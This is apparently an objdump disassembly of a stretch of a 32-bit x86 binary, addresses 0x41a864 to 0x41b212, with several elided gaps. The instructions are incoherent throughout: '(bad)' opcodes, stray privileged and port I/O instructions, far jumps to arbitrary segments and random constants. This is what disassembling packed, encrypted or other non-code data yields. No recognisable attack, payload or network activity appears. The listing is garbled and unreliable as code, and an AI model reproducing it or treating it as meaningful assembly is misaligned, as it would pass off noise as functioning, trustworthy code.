  41a864:	(bad)  [ecx+0x11d67]
  41a86a:	add    BYTE PTR [ecx],al
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	lahf   
  41a86f:	mov    al,ds:0x4a47efab
  41a874:	sti    
  41a875:	pop    ebp
  41a876:	cmp    DWORD PTR ds:0xec4a99a0,0xcd399902
  41a880:	xor    BYTE PTR [eax],bh
  41a882:	add    eax,0x17957cbf
  41a887:	lock sbb dl,BYTE PTR [esi]
  41a88a:	and    eax,0x2168ebbb
  41a88f:	push   ebx
  41a890:	xlat   BYTE PTR ds:[ebx]
  41a891:	jb     0x41a8f3
  41a893:	or     ecx,DWORD PTR [edx+0x60636030]
  41a899:	cwde   
  41a89a:	adc    al,0xcd
  41a89c:	push   eax
  41a89d:	(bad)  
  41a89e:	mov    eax,ds:0x843119e7
  41a8a3:	test   DWORD PTR [edi+ecx*2-0x52135312],0xde154ec9
  41a8ae:	inc    esp
  41a8af:	dec    DWORD PTR [edi]
  41a8b1:	sub    al,0xc
  41a8b3:	inc    ecx
  41a8b4:	cmp    DWORD PTR [edi],ebp
  41a8b6:	fist   WORD PTR [esi]
  41a8b8:	pusha  
  41a8b9:	in     eax,0xda
  41a8bb:	dec    edx
  41a8bc:	(bad)  
  41a8be:	leave  
  41a8bf:	and    bh,bh
  41a8c1:	ins    BYTE PTR es:[edi],dx
  41a8c2:	pop    esp
  41a8c3:	(bad)  
  41a8c5:	imul   ebx,eax,0xffffffee
  41a8c8:	icebp  
  41a8c9:	mov    ebx,0xd8d2af44
  41a8ce:	cs push 0x9e9769de
  41a8d4:	xor    dh,dl
  41a8d6:	adc    al,0x19
  41a8d8:	les    ebx,FWORD PTR ds:0xf4c75638
  41a8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8df:	mov    bl,BYTE PTR [ebp+0x58]
  41a8e2:	sbb    bl,bl
  41a8e4:	jne    0x41a8eb
  41a8e6:	mov    bl,0x3d
  41a8e8:	jmp    0x6bf22a7c
  41a8ed:	xor    eax,0x4969a033
  41a8f2:	lock out dx,al
  41a8f4:	push   ss
  41a8f5:	pop    eax
  41a8f6:	sub    esi,edi
  41a8f8:	mov    bh,0x99
  41a8fa:	fwait
  41a8fb:	enter  0x8025,0x3c
  41a8ff:	cmp    cl,dl
  41a901:	jnp    0x41a903
  41a903:	jnp    0x41a97b
  41a905:	int    0x6a
  41a907:	fld    QWORD PTR [ecx+0x66]
  41a90a:	pop    ebx
  41a90b:	pop    es
  41a90c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a90d:	inc    ebp
  41a90e:	and    BYTE PTR [esp+edx*8-0x4bd6b19f],al
  41a915:	pushf  
  41a916:	sub    bh,dh
  41a918:	aaa    
  41a919:	cdq    
  41a91a:	ret    
  41a91b:	lahf   
  41a91c:	push   esi
  41a91d:	fcmovnbe st,st(4)
  41a91f:	(bad)  
  41a920:	sbb    DWORD PTR [esp+ebp*1+0x64e20e9],esi
  41a927:	inc    esp
  41a928:	rol    BYTE PTR [edx+0x5805cc35],cl
  41a92e:	mov    dh,0xa1
  41a930:	daa    
  41a931:	push   ebp
  41a932:	fmulp  st(3),st
  41a934:	push   eax
  41a935:	lahf   
  41a936:	stos   DWORD PTR es:[edi],eax
  41a937:	xchg   esi,eax
  41a938:	push   ebx
  41a939:	mov    ebx,0x6e8b7f42
  41a93e:	or     DWORD PTR [ebx+0x6a052ded],ebx
  41a944:	mov    BYTE PTR [ecx],dl
  41a946:	into   
  41a947:	pusha  
  41a948:	sub    al,BYTE PTR [eax-0x2ccb1722]
  41a94e:	adc    eax,edx
  41a950:	sub    dl,ch
  41a952:	shr    BYTE PTR [esi],0xe0
  41a955:	add    DWORD PTR [ecx-0x72],edi
  41a958:	add    dl,al
  41a95a:	mov    dh,0x35
  41a95c:	inc    edi
  41a95d:	or     eax,0xacd6757c
  41a962:	jne    0x41a948
  41a964:	ret    0x12df
  41a967:	ja     0x41a924
  41a969:	xchg   edx,eax
  41a96a:	adc    DWORD PTR [ecx+0x77f1],ebp
	...
  41a9d4:	add    BYTE PTR [eax],al
  41a9d6:	xor    eax,0xcf4a867e
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	stos   DWORD PTR es:[edi],eax
  41a9e3:	(bad)  
  41a9e4:	pop    edi
  41a9e5:	clc    
  41a9e6:	addr16 push ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	shl    DWORD PTR [ebx-0x349f5539],cl
  41a9f4:	inc    edx
  41a9f5:	repz pop edi
  41a9f7:	ja     0x41aa07
  41a9f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9fa:	fcomp  DWORD PTR [eax+0x4537b680]
  41aa00:	pop    ecx
  41aa01:	fwait
  41aa02:	dec    eax
  41aa03:	xchg   DWORD PTR [edi+0x5b934192],eax
  41aa09:	inc    BYTE PTR [ebx+0x3f]
  41aa0c:	add    al,0x3c
  41aa0e:	int3   
  41aa0f:	scas   eax,DWORD PTR es:[edi]
  41aa10:	hlt    
  41aa11:	sub    ebx,ebx
  41aa13:	stc    
  41aa14:	inc    edi
  41aa15:	or     DWORD PTR [ebx-0x5b],edi
  41aa18:	fwait
  41aa19:	cmp    al,0xfe
  41aa1b:	shl    DWORD PTR [ecx],0x4c
  41aa1e:	pop    ebx
  41aa1f:	loope  0x41aa44
  41aa21:	icebp  
  41aa22:	ins    BYTE PTR es:[edi],dx
  41aa23:	je     0x41a9bb
  41aa25:	mov    ecx,0xfd42b6d1
  41aa2a:	mov    ds,edx
  41aa2c:	dec    ebp
  41aa2d:	xor    edi,ebp
  41aa2f:	fisubr DWORD PTR [ebx+0x19]
  41aa32:	retf   
  41aa33:	bound  eax,QWORD PTR [edi]
  41aa35:	outs   dx,DWORD PTR ds:[esi]
  41aa36:	test   al,0x98
  41aa38:	add    al,0xd0
  41aa3a:	sub    DWORD PTR ds:[eax+0x32],ecx
  41aa3e:	cli    
  41aa3f:	stos   DWORD PTR es:[edi],eax
  41aa40:	in     eax,0xd2
  41aa42:	jns    0x41a9cf
  41aa44:	push   0x78719a84
  41aa49:	nop
  41aa4a:	pop    ss
  41aa4b:	clc    
  41aa4c:	fstp   DWORD PTR [eax+ebp*4]
  41aa4f:	idiv   DWORD PTR [edx-0x3c]
  41aa52:	stc    
  41aa53:	test   ebx,esp
  41aa55:	sbb    al,0x9f
  41aa57:	lock aas 
  41aa59:	or     ah,cl
  41aa5b:	fsub   DWORD PTR [ecx+0x57]
  41aa5e:	inc    edx
  41aa5f:	push   edi
  41aa60:	(bad)  
  41aa61:	jb     0x41aace
  41aa63:	and    al,0x64
  41aa65:	loop   0x41aa83
  41aa67:	aam    0xf1
  41aa69:	push   ss
  41aa6a:	cmp    DWORD PTR [esp+eax*2],ebx
  41aa6d:	bound  esi,QWORD PTR ds:0x5e03cea8
  41aa73:	and    eax,0x55f9a473
  41aa78:	cli    
  41aa79:	cld    
  41aa7a:	sbb    DWORD PTR [ebx+0x4f30311b],ebp
  41aa80:	int    0xaa
  41aa82:	lock jae 0x41aabe
  41aa85:	jmp    0xeb39:0x3c9373a2
  41aa8c:	and    eax,0xd3866a46
  41aa91:	jmp    0xd36:0x1e974b0b
  41aa98:	pop    esi
  41aa99:	jmp    0xf9e64511
  41aa9e:	ficom  WORD PTR [eax-0x23]
  41aaa1:	jo     0x41ab22
  41aaa3:	fstp   QWORD PTR ds:0xc225db5c
  41aaa9:	xchg   ebx,eax
  41aaaa:	in     al,dx
  41aaab:	adc    DWORD PTR [ecx],ecx
  41aaad:	inc    esp
  41aaae:	mov    ch,0x7e
  41aab0:	mov    edx,0x8866b8fe
  41aab5:	xor    eax,0x2413db93
  41aaba:	daa    
  41aabb:	sbb    ch,BYTE PTR [ecx+esi*8-0x4a824212]
  41aac2:	jmp    0x41ab31
  41aac4:	push   es
  41aac5:	cmp    DWORD PTR [ebp-0x33d4040d],0x23
  41aacc:	and    eax,0xaf51ce7
  41aad1:	pop    esi
  41aad2:	lahf   
  41aad3:	cmp    DWORD PTR [ecx+0x21f12b09],edi
  41aad9:	aas    
  41aada:	dec    edi
  41aadb:	lds    ecx,FWORD PTR [edi]
  41aadd:	mov    dl,0x81
  41aadf:	(bad)  
  41aae0:	mov    edi,0x666a6adb
  41aae5:	sub    ebp,DWORD PTR [edx]
  41aae7:	xchg   BYTE PTR [esi+0x401a10e2],cl
  41aaed:	scas   eax,DWORD PTR es:[edi]
	...
  41ab56:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	and    ch,BYTE PTR [ecx+0x1f6777a9]
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	out    dx,eax
  41ab6f:	aaa    
  41ab70:	cmp    al,BYTE PTR [edx-0x44f6eeae]
  41ab76:	popf   
  41ab77:	fist   WORD PTR [ebp+0x75ad42a1]
  41ab7d:	jl     0x41abe8
  41ab7f:	scas   al,BYTE PTR es:[edi]
  41ab80:	push   es
  41ab81:	or     al,BYTE PTR [esi+0x5]
  41ab84:	pop    esp
  41ab85:	or     dh,al
  41ab87:	add    bh,bh
  41ab89:	and    eax,0x5058e3f8
  41ab8e:	fmul   DWORD PTR [ebx+0x49]
  41ab91:	(bad)  
  41ab92:	sbb    DWORD PTR [esi],ebx
  41ab94:	sub    ebp,DWORD PTR [edx]
  41ab96:	lock stc 
  41ab98:	fsqrt  
  41ab9a:	mov    ds:0x1dee9ef0,al
  41ab9f:	jecxz  0x41ab9e
  41aba1:	js     0x41abe0
  41aba3:	xchg   esp,eax
  41aba4:	mov    ds:0xde398fb2,eax
  41aba9:	rol    al,1
  41abab:	mov    eax,0xc3fc6048
  41abb0:	loopne 0x41ab76
  41abb2:	dec    esi
  41abb3:	arpl   bp,cx
  41abb5:	test   BYTE PTR [eax+eax*2+0x5ecaca9b],bh
  41abbc:	xor    ah,BYTE PTR [edi-0x30]
  41abbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abc0:	mov    edi,0x7670e04c
  41abc5:	jbe    0x41ac1d
  41abc7:	mov    cl,0xa2
  41abc9:	stos   DWORD PTR es:[edi],eax
  41abca:	sub    ebp,DWORD PTR [ebp+0x55]
  41abcd:	(bad)  
  41abce:	ss pop edx
  41abd0:	mov    esi,0x46dc7998
  41abd5:	idiv   BYTE PTR [ecx+eax*4+0x6d]
  41abd9:	pmuludq mm6,mm4
  41abdc:	shl    BYTE PTR [esi-0x1d],cl
  41abdf:	je     0x41ab9b
  41abe1:	dec    eax
  41abe2:	arpl   WORD PTR [ecx-0x51],cx
  41abe5:	mov    eax,0xdda3fa94
  41abea:	mov    edx,0xee9f37f
  41abef:	push   cs
  41abf0:	sbb    cl,BYTE PTR [eax+0x26]
  41abf3:	fnstcw WORD PTR [eax]
  41abf5:	aad    0xec
  41abf7:	adc    al,0xa7
  41abf9:	addr16 fwait
  41abfb:	pop    ebx
  41abfc:	mov    dl,0xba
  41abfe:	jbe    0x41ac63
  41ac00:	push   edx
  41ac01:	rcr    DWORD PTR [ecx],0x31
  41ac04:	stc    
  41ac05:	mov    eax,ds:0x68fdea80
  41ac0a:	add    eax,0xe70f100e
  41ac0f:	int    0xa9
  41ac11:	push   ebp
  41ac12:	and    edx,ecx
  41ac14:	sbb    eax,0xe489d30b
  41ac19:	cmc    
  41ac1a:	sar    DWORD PTR [ebp-0x63],0x59
  41ac1e:	call   0xb43c:0x6b781f60
  41ac25:	(bad)  
  41ac26:	xchg   edi,eax
  41ac27:	and    DWORD PTR [esi-0x15b7be3c],esi
  41ac2d:	push   ss
  41ac2e:	xchg   ecx,eax
  41ac2f:	jnp    0x41ac76
  41ac31:	xchg   BYTE PTR [eax+0x7c250b8d],al
  41ac37:	nop
  41ac38:	call   0xe8f9:0x6d971562
  41ac3f:	inc    ecx
  41ac40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac41:	js     0x41ac63
  41ac43:	push   ebx
  41ac44:	js     0x41ac65
  41ac46:	xor    eax,DWORD PTR [esi]
  41ac48:	repz data16 fld TBYTE PTR [edi]
  41ac4c:	push   ecx
  41ac4d:	pop    eax
  41ac4e:	mov    eax,ecx
  41ac50:	sbb    edx,edi
  41ac52:	pop    ss
  41ac53:	mov    ?,WORD PTR [eax+0x7e]
  41ac56:	stc    
  41ac57:	and    eax,0x5b8e23cb
  41ac5c:	push   esp
  41ac5d:	mov    esi,DWORD PTR [ebx]
  41ac5f:	sub    DWORD PTR [ebx+esi*8+0x20b9d874],esi
  41ac66:	retf   0x59e4
  41ac69:	jl     0x41ac58
  41ac6b:	mov    ds:0x9756,eax
	...
  41acd4:	add    BYTE PTR [eax],al
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [eax+ebx*2+0x3b]
  41ace4:	pop    es
  41ace5:	sub    esp,DWORD PTR [edi+0x20]
  41ace8:	add    DWORD PTR [eax],eax
  41acea:	add    BYTE PTR [ecx],al
  41acec:	add    BYTE PTR [eax],al
  41acee:	repz ror BYTE PTR ds:[esi],cl
  41acf2:	pop    edx
  41acf3:	mov    WORD PTR [ecx],es
  41acf5:	ins    DWORD PTR es:[edi],dx
  41acf6:	iret   
  41acf7:	(bad)  
  41acf8:	sbb    DWORD PTR [edi+ecx*4],edx
  41acfb:	push   cs
  41acfc:	add    eax,0xfb0ca6a8
  41ad01:	pop    esi
  41ad02:	sbb    eax,0x647d0dda
  41ad07:	rcl    BYTE PTR [ecx-0x5ddcdd1e],cl
  41ad0d:	icebp  
  41ad0e:	fs sbb ecx,ebp
  41ad11:	cmc    
  41ad12:	jle    0x41ad45
  41ad14:	std    
  41ad15:	pushf  
  41ad16:	inc    edx
  41ad17:	(bad)  [ecx]
  41ad19:	test   cl,ah
  41ad1b:	sbb    bl,BYTE PTR [ebp-0x4c86a489]
  41ad21:	jnp    0x41ad13
  41ad23:	and    DWORD PTR [ebx+0x1b],ebx
  41ad26:	and    ebp,ecx
  41ad28:	xchg   BYTE PTR [edi-0x39],bh
  41ad2b:	inc    ebx
  41ad2c:	mov    dl,0x2d
  41ad2e:	cdq    
  41ad2f:	jge    0x41acff
  41ad31:	adc    al,0xf2
  41ad33:	xchg   esp,eax
  41ad34:	fs stos DWORD PTR es:[edi],eax
  41ad36:	dec    eax
  41ad37:	sub    al,0x20
  41ad39:	cmp    cl,BYTE PTR [ecx-0x1f]
  41ad3c:	das    
  41ad3d:	mov    al,0x86
  41ad3f:	mov    ah,0xa1
  41ad41:	loop   0x41adb3
  41ad43:	sti    
  41ad44:	es inc ebp
  41ad46:	cmc    
  41ad47:	dec    edi
  41ad48:	push   esp
  41ad49:	jmp    0xbd5c0466
  41ad4e:	mov    bh,0xe6
  41ad50:	les    ebp,FWORD PTR [edi+0x5b]
  41ad53:	mov    al,0x87
  41ad55:	int3   
  41ad56:	les    eax,FWORD PTR [ebp+0x32]
  41ad59:	jg     0x41ad91
  41ad5b:	test   al,0x1c
  41ad5d:	enter  0xd967,0xd6
  41ad61:	(bad)  [ebx]
  41ad63:	dec    eax
  41ad64:	jp     0x41ad7e
  41ad66:	cwde   
  41ad67:	pop    ebp
  41ad68:	aam    0x7a
  41ad6a:	xchg   edx,eax
  41ad6b:	or     dh,ch
  41ad6d:	mov    ebp,0xf4d60c9d
  41ad72:	sahf   
  41ad73:	loopne 0x41ad80
  41ad75:	scas   eax,DWORD PTR es:[edi]
  41ad76:	mov    ebx,0x5206eebf
  41ad7b:	pop    eax
  41ad7c:	cmp    cl,BYTE PTR [ebp-0x2e3cc2f1]
  41ad82:	push   ebx
  41ad83:	jnp    0x41adf4
  41ad85:	mov    ebp,0x44de2dad
  41ad8a:	add    BYTE PTR [edi+eiz*4-0x30db14b7],dl
  41ad91:	fdiv   DWORD PTR [edi+0x50e7679c]
  41ad97:	out    0x35,al
  41ad99:	mov    eax,0xf9effda6
  41ad9e:	test   DWORD PTR ds:[eax-0x4239d659],0x47063d7a
  41ada9:	and    al,0x5d
  41adab:	dec    eax
  41adac:	cmc    
  41adad:	mov    ecx,0x6e3e5d88
  41adb2:	aam    0x8d
  41adb4:	cmp    eax,0x6a64f021
  41adb9:	cmp    bl,BYTE PTR [edx-0x14999f26]
  41adbf:	dec    ebp
  41adc0:	mov    dl,0x5
  41adc2:	fbld   TBYTE PTR [edi+edi*1-0x397d5eec]
  41adc9:	sub    eax,0x996dcdb1
  41adce:	ja     0x41ae2c
  41add0:	add    ch,0x52
  41add3:	sahf   
  41add4:	mov    eax,ds:0x6b79fc56
  41add9:	add    al,0xb6
  41addb:	push   edx
  41addc:	loope  0x41ad66
  41adde:	or     edi,DWORD PTR [ebx-0x72485822]
  41ade4:	test   eax,0xc7001c20
  41ade9:	push   ebx
  41adea:	out    0x6,eax
  41adec:	imul   esi,DWORD PTR [ebp+0x0],0x0
	...
  41ae54:	add    BYTE PTR [eax],al
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [eax+ecx*4+0x6732bc5c],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    BYTE PTR [eax+0x41397653],bh
  41ae73:	push   edi
  41ae74:	test   BYTE PTR [ebx-0x65695ba],dh
  41ae7a:	pop    esi
  41ae7b:	pop    ecx
  41ae7c:	mov    ah,0xba
  41ae7e:	in     al,dx
  41ae7f:	jnp    0x41ae05
  41ae81:	pop    es
  41ae82:	mov    ecx,eax
  41ae84:	jle    0x41ae18
  41ae86:	iret   
  41ae87:	xor    bl,BYTE PTR [edx-0x9c6d075]
  41ae8d:	mov    ah,0x14
  41ae8f:	xor    BYTE PTR [ecx+ecx*1],cl
  41ae92:	mov    dl,BYTE PTR [ebx+eax*8]
  41ae95:	outs   dx,DWORD PTR ds:[esi]
  41ae96:	or     al,0x61
  41ae98:	stos   BYTE PTR es:[edi],al
  41ae99:	dec    esi
  41ae9a:	out    dx,eax
  41ae9b:	xchg   edx,eax
  41ae9c:	or     ebp,DWORD PTR [eax]
  41ae9e:	mov    edx,0x2ed9cb36
  41aea3:	mov    bh,BYTE PTR [ebp-0x37]
  41aea6:	gs or  al,0xe5
  41aea9:	scas   eax,DWORD PTR es:[edi]
  41aeaa:	bound  edi,QWORD PTR [edx+edx*1-0x63]
  41aeae:	aad    0xa
  41aeb0:	sahf   
  41aeb1:	popf   
  41aeb2:	stos   DWORD PTR es:[edi],eax
  41aeb3:	popf   
  41aeb4:	fnstenv [ebx+0x3a]
  41aeb7:	adc    ebp,DWORD PTR [esi]
  41aeb9:	in     eax,dx
  41aeba:	xchg   ebp,eax
  41aebb:	in     eax,dx
  41aebc:	outs   dx,DWORD PTR ds:[si]
  41aebe:	arpl   WORD PTR [ecx-0x40069570],ax
  41aec4:	ins    BYTE PTR es:[edi],dx
  41aec5:	pop    ebp
  41aec6:	loop   0x41aeea
  41aec8:	dec    esp
  41aec9:	pop    esi
  41aeca:	int3   
  41aecb:	fstp   TBYTE PTR ds:0x80245b1c
  41aed1:	shr    BYTE PTR [edi-0x7dd61508],1
  41aed7:	jne    0x41af22
  41aed9:	sub    BYTE PTR [edi+0x34],dh
  41aedc:	je     0x41af4e
  41aede:	jae    0x41aec6
  41aee0:	loopne 0x41aeb0
  41aee2:	push   eax
  41aee3:	sbb    edx,esp
  41aee5:	xchg   edi,eax
  41aee6:	push   0xceef3d5d
  41aeeb:	aad    0xb
  41aeed:	pop    edx
  41aeee:	fimul  WORD PTR [edx]
  41aef0:	jne    0x41ae89
  41aef2:	jns    0x41af64
  41aef4:	cmc    
  41aef5:	pop    ds
  41aef6:	sbb    BYTE PTR [ebx-0x6da5bf39],bh
  41aefc:	fst    QWORD PTR ds:0xa7306e8e
  41af02:	and    ebx,esi
  41af04:	dec    esp
  41af05:	scas   al,BYTE PTR es:[edi]
  41af06:	inc    ecx
  41af07:	cmp    BYTE PTR [edi],0x84
  41af0a:	aaa    
  41af0b:	jp     0x41aec7
  41af0d:	pop    esp
  41af0e:	stos   BYTE PTR es:[edi],al
  41af0f:	xor    esp,ebx
  41af11:	inc    edi
  41af12:	sub    dl,bl
  41af14:	aas    
  41af15:	dec    edx
  41af16:	loopne 0x41aeaa
  41af18:	clc    
  41af19:	jg     0x41af23
  41af1b:	lds    ebx,FWORD PTR [esi-0x17159b73]
  41af21:	sahf   
  41af22:	shl    eax,0xad
  41af25:	call   0xeb58:0x6901df16
  41af2c:	cmp    eax,0x5705954c
  41af31:	xchg   ecx,eax
  41af32:	jl     0x41afb1
  41af34:	adc    esp,eax
  41af36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af37:	pop    eax
  41af38:	pop    edi
  41af39:	pop    esp
  41af3a:	mov    bh,0x5
  41af3c:	push   es
  41af3d:	arpl   bx,di
  41af3f:	nop
  41af40:	inc    ecx
  41af41:	sbb    ecx,DWORD PTR [ecx-0x55]
  41af44:	dec    edx
  41af45:	mov    al,0xb
  41af47:	xchg   esp,eax
  41af48:	cmp    DWORD PTR [eax],0xffffff90
  41af4b:	xchg   esi,eax
  41af4c:	jb     0x41aef7
  41af4e:	sar    BYTE PTR [edx+0x60],0x4f
  41af52:	sbb    bh,ch
  41af54:	xchg   ebx,eax
  41af55:	dec    ebp
  41af56:	cmp    eax,0x42d4c720
  41af5b:	cmp    edi,ecx
  41af5d:	test   BYTE PTR [ecx-0x42],bl
  41af60:	pop    DWORD PTR [ecx-0x5c49dd97]
  41af66:	inc    eax
  41af67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af68:	push   es
  41af69:	adc    ebx,DWORD PTR [edi+ebp*4+0x42]
  41af6d:	scas   al,BYTE PTR es:[edi]
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0xaba744ee
  41afe4:	aas    
  41afe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afe6:	and    al,BYTE PTR [bx+di]
  41afe9:	add    BYTE PTR [eax],al
  41afeb:	add    DWORD PTR [eax],eax
  41afed:	add    BYTE PTR [ebx-0x4c],bh
  41aff0:	lea    ebp,[ebp+0x409b9b48]
  41aff6:	add    eax,0x1d056407
  41affb:	adc    BYTE PTR [edx-0x14],cl
  41affe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afff:	inc    ebp
  41b000:	inc    ebp
  41b001:	ret    
  41b002:	push   ebx
  41b003:	retf   
  41b004:	pop    ds
  41b005:	repz or eax,0x76d329a1
  41b00b:	je     0x41b06a
  41b00d:	mov    cl,0x47
  41b00f:	sbb    al,0x2
  41b011:	xchg   ecx,eax
  41b012:	pop    edi
  41b013:	dec    eax
  41b014:	pop    edi
  41b015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b016:	sar    BYTE PTR [ebx+0x5c],0x38
  41b01a:	inc    BYTE PTR [ebx-0x27]
  41b01d:	pop    edx
  41b01e:	gs leave 
  41b020:	sbb    ebp,DWORD PTR [ebx-0x7c06afd5]
  41b026:	in     al,dx
  41b027:	mov    edi,0x26b1da81
  41b02c:	test   BYTE PTR [ebx],ch
  41b02e:	fdiv   DWORD PTR [ebx-0x2f]
  41b031:	lock mov ah,0x5
  41b034:	loope  0x41afec
  41b036:	in     eax,dx
  41b037:	or     al,0xe6
  41b039:	lea    eax,ds:0x1ee0b40c
  41b03f:	ror    BYTE PTR [ebx-0x16930e77],1
  41b045:	add    edi,DWORD PTR [esi+0x4be45acf]
  41b04b:	std    
  41b04c:	sti    
  41b04d:	ja     0x41b058
  41b04f:	push   cs
  41b050:	ror    DWORD PTR [ebp+0x76],cl
  41b053:	out    dx,al
  41b054:	addr16 cwde 
  41b056:	stos   BYTE PTR es:[edi],al
  41b057:	adc    BYTE PTR [edx-0x5cc32be5],ah
  41b05d:	cmp    DWORD PTR [ecx],ebx
  41b05f:	jmp    0x16c4:0x985a0ac3
  41b066:	pop    eax
  41b068:	mov    ds:0xa23b7f42,al
  41b06d:	and    BYTE PTR [ecx],0xe0
  41b070:	push   ecx
  41b071:	sbb    dl,BYTE PTR [esp+ebx*4]
  41b074:	bound  eax,QWORD PTR [edx+0x1e]
  41b077:	test   DWORD PTR [esi+esi*1],esi
  41b07a:	cld    
  41b07b:	fwait
  41b07c:	dec    edi
  41b07d:	inc    esp
  41b07e:	(bad)  
  41b07f:	mov    bl,0x41
  41b081:	fimul  WORD PTR [eax-0x2b8f0e2e]
  41b087:	jo     0x41b0b9
  41b089:	test   eax,0x7393c2fc
  41b08e:	pop    edi
  41b08f:	mov    eax,0xcaacdfc4
  41b094:	sti    
  41b095:	or     ebx,DWORD PTR [ebx+0x6a]
  41b098:	xor    esp,DWORD PTR [ebx]
  41b09a:	cmp    al,0x5c
  41b09c:	xor    BYTE PTR [ebp-0x54],0x5c
  41b0a0:	shl    DWORD PTR [ecx+0x4f],cl
  41b0a3:	pop    edi
  41b0a4:	jmp    0x92f3636e
  41b0a9:	aaa    
  41b0aa:	bound  esi,QWORD PTR [ebp-0x67]
  41b0ad:	shl    eax,1
  41b0af:	xor    DWORD PTR [ebx+0x45436c27],ecx
  41b0b5:	rol    DWORD PTR [edi],cl
  41b0b7:	int    0xfd
  41b0b9:	sub    al,0x2c
  41b0bb:	scas   eax,DWORD PTR es:[edi]
  41b0bc:	repnz out 0xad,eax
  41b0bf:	(bad)  
  41b0c0:	aad    0xf6
  41b0c2:	sbb    BYTE PTR [ecx],dl
  41b0c4:	retf   
  41b0c5:	outs   dx,DWORD PTR ds:[esi]
  41b0c6:	dec    BYTE PTR [ecx-0x50ec72ba]
  41b0cc:	mov    bl,0x28
  41b0ce:	inc    edx
  41b0cf:	lea    ebp,[edi-0x1f]
  41b0d2:	sbb    al,0x35
  41b0d4:	cmp    BYTE PTR cs:[esi-0x2b],al
  41b0d8:	icebp  
  41b0d9:	hlt    
  41b0da:	scas   al,BYTE PTR es:[edi]
  41b0db:	xlat   BYTE PTR ds:[ebx]
  41b0dc:	(bad)  
  41b0dd:	cmp    al,0x7d
  41b0df:	and    al,0x84
  41b0e1:	jno    0x41b0ff
  41b0e3:	push   edx
  41b0e4:	xchg   edx,eax
  41b0e5:	sbb    dh,BYTE PTR [esi-0x4ec80d19]
  41b0eb:	mov    ecx,0x32e7
	...
  41b154:	add    BYTE PTR [eax],al
  41b156:	(bad)  
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x1683becd
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [ecx],bh
  41b16f:	and    DWORD PTR [ebp-0x4de3c39d],eax
  41b175:	dec    edx
  41b176:	ficomp DWORD PTR [edx]
  41b178:	jns    0x41b197
  41b17a:	adc    ah,BYTE PTR [esi+ebx*2-0x41]
  41b17e:	dec    edx
  41b17f:	je     0x41b157
  41b181:	test   BYTE PTR [esi+0x2903556e],0xfa
  41b188:	(bad)  
  41b189:	sahf   
  41b18a:	mov    edx,0xf0a8ab0
  41b18f:	push   cs
  41b190:	rcl    DWORD PTR [edi+0x7],0xb0
  41b194:	or     DWORD PTR [ebx-0x2d19691f],edi
  41b19a:	jmp    0x88c4e4ae
  41b19f:	mov    cl,BYTE PTR [ebx-0x47]
  41b1a2:	call   0x5e7dadf3
  41b1a7:	shr    edi,cl
  41b1a9:	xchg   edi,eax
  41b1ab:	stos   DWORD PTR es:[edi],eax
  41b1ac:	test   al,0x0
  41b1ae:	iret   
  41b1af:	and    eax,0x50a90fa5
  41b1b4:	jmp    0x8878:0x443787d4
  41b1bb:	sub    al,0x6c
  41b1bd:	fwait
  41b1be:	retf   0x5d5e
  41b1c1:	sbb    eax,0x6cbc5098
  41b1c6:	xor    esp,DWORD PTR [ebx+0x7d]
  41b1c9:	mov    cl,0x91
  41b1cb:	stos   BYTE PTR es:[edi],al
  41b1cc:	je     0x41b1e8
  41b1ce:	jno    0x41b1ab
  41b1d0:	mov    edi,0x54217d35
  41b1d5:	stos   BYTE PTR es:[edi],al
  41b1d6:	push   es
  41b1d7:	and    DWORD PTR [eax-0x4ac85bf9],eax
  41b1dd:	pop    edx
  41b1de:	pop    ebx
  41b1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1e0:	jbe    0x41b23d
  41b1e2:	mov    esp,0x1f2e476b
  41b1e7:	jmp    0x3ed9:0xe4ed16f1
  41b1ee:	sbb    DWORD PTR [ebp+edi*4+0x56],esi
  41b1f2:	pop    edx
  41b1f3:	les    edi,FWORD PTR [edi+0x3236637d]
  41b1f9:	jo     0x41b1eb
  41b1fb:	in     al,0x45
  41b1fd:	xor    eax,0x62abfc2e
  41b202:	imul   ebp,DWORD PTR [edi-0x28cf84ce],0x12e4c7f6
  41b20c:	es icebp 
  41b20e:	rcl    ah,1
  41b210:	out    0xd0,al
  41b212:	or     eax,0x5eb86517
